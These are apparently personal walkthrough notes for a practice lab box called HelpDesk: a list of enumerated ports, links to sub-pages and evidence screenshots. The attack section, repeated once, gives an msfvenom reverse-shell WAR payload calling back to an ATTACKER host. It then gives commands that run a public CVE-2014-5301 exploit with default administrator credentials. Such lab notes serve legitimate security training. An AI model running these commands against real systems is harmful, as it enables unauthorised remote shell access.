# HelpDesk

Sanitized practice-box notes. Folder layout matches the Obsidian template: **General Info → External (per port) → Exploit → Internal / Priv Esc → Loot**, with **Evidence** next to the phase where the screenshot was taken.

| | |
| --- | --- |
| OS (guess from ports) | Unknown |
| Notes | Personal walkthrough, not a spoiler-free writeup |

## Layout

- [General Info](General-Info.md)
- [Exploit](Exploit.md)
- [Loot](Loot.md)
- [External](External/) — per-port enumeration
- [Internal / Priv Esc](Internal/Priv-Esc.md)

### Ports touched

- `135-RPC`
- `139-netbios-ssn`
- `3389-RDP`
- `8080-http`
- `UDP-137-`

## Attack notes

msfvenom -p java/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f war > shell.war ./CVE-2014-5301.py HOST PORT USERNAME PASSWORD WARFILE python3 CVE-2014-5301.py TARGET 8080 administrator administrator shell.war

### Commands used

```bash
msfvenom -p java/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f war > shell.war
./CVE-2014-5301.py HOST PORT USERNAME PASSWORD WARFILE
python3 CVE-2014-5301.py TARGET 8080 administrator administrator shell.war
```


### References

- https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py

## Evidence

![Pasted image 20240621102524.png](Evidence/Pasted%20image%2020240621102524.png)

![Pasted image 20240621102716.png](Internal/Evidence/Pasted%20image%2020240621102716.png)

![Pasted image 20240621101827.png](External/Evidence/Pasted%20image%2020240621101827.png)

![Pasted image 20240621100009.png](External/Evidence/Pasted%20image%2020240621100009.png)

![Pasted image 20240621100944.png](External/Evidence/Pasted%20image%2020240621100944.png)

![Pasted image 20240621101251.png](External/Evidence/Pasted%20image%2020240621101251.png)
